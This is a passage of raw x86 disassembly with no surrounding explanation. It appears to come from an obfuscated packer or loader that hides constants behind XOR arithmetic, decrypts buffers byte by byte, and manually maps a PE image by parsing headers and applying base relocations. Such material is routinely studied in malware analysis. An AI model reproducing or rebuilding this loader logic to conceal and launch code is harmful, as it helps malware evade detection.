  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
